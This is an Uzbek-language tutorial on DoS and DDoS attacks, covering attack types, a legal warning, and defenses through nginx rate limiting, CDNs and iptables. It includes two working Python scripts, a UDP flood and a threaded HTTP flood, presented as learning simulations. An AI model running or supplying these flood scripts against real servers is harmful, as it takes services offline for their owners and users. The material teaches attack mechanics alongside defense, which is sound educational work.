# DoS va DDoS

Serverni ishlashdan chiqarish hujumlari.

---

## DoS (Denial Of Service)

Bitta manbadan serverga hujum.

```text
Attacker
    ↓
Server (band bo'ladi)
```

---

## DDoS (Distributed Denial Of Service)

Ko'p manbadan serverga hujum.

```text
Bot 1  ─┐
Bot 2  ─┤
Bot 3  ─┼→ Server (band bo'ladi)
Bot 4  ─┤
Bot 5  ─┘
```

---

## DoS vs DDoS

| Xususiyat | DoS | DDoS |
|-----------|-----|------|
| Manba soni | 1 | Ko'p (minglab) |
| Kuchi | Kam | Juda katta |
| aniqlash | Oson | Qiyin |
| Himoya | Oson | CDN, Rate Limiting kerak |

---

## DDoS turlari

| Tur | Layer | Usul |
|-----|-------|------|
| Volumetric | L3/L4 | UDP Flood, ICMP Flood |
| Protocol | L4 | SYN Flood, Ping of Death |
| Application | L7 | HTTP Flood, Slowloris |

---

## ⚠️ Ogohlantirish

**Faqat o'z serveringizda sinang!**

Ruxsatsiz DDoS hujumi:
- JINOYAT
- Jiddiy huquqiy oqibatlar
- Faqat o'rganish uchun

---

## Amaliy misol (o'rganish uchun)

### UDP Flood simulyatsiya

```python
import socket
import threading

def udp_flood(target_ip, target_port, packet_size=1024):
    """UDP Flood - faqat o'z tarmog'ingizda sinang!"""
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = b"A" * packet_size
    
    sent = 0
    while True:
        try:
            sock.sendto(data, (target_ip, target_port))
            sent += 1
            if sent % 1000 == 0:
                print(f"[*] Sent {sent} packets")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Error: {e}")
            break
    
    sock.close()
    print(f"[*] Total sent: {sent} packets")

# Ishlatish (faqat o'z tarmog'ingizda!)
# udp_flood("192.168.1.100", 80)
```

### HTTP Flood simulyatsiya

```python
import socket
import threading

def http_flood(target_ip, target_port, num_threads=10):
    """HTTP Flood - faqat o'z tarmog'ingizda sinang!"""
    
    def attack():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((target_ip, target_port))
                
                request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nConnection: keep-alive\r\n\r\n"
                sock.send(request.encode())
                
                response = sock.recv(1024)
                sock.close()
            except:
                pass
    
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        threads.append(t)
    
    print(f"[*] {num_threads} threads started")
    
    # Threads ni kutish
    for t in threads:
        t.join()

# Ishlatish (faqat o'z tarmog'ingizda!)
# http_flood("192.168.1.100", 8080, 5)
```

---

## Himoya

### 1. Rate Limiting

```nginx
# Nginx
limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;

server {
    location / {
        limit_req zone=one burst=20;
    }
}
```

### 2. CDN (Cloudflare, AWS CloudFront)

```text
CDN = Content Delivery Network

Foydalar:
- DDoS himoya
- Cache
- Load Balancing
```

### 3. Firewall

```bash
# iptables bilan rate limiting
sudo iptables -A INPUT -p tcp --dport 80 -m limit --limit 100/minute --limit-burst 200 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 80 -j DROP
```

---

## Xulosa

- DoS = bitta manba, DDoS = ko'p manba
- Volumetric, Protocol, Application turlari bor
- CDN, Rate Limiting, Firewall bilan himoya
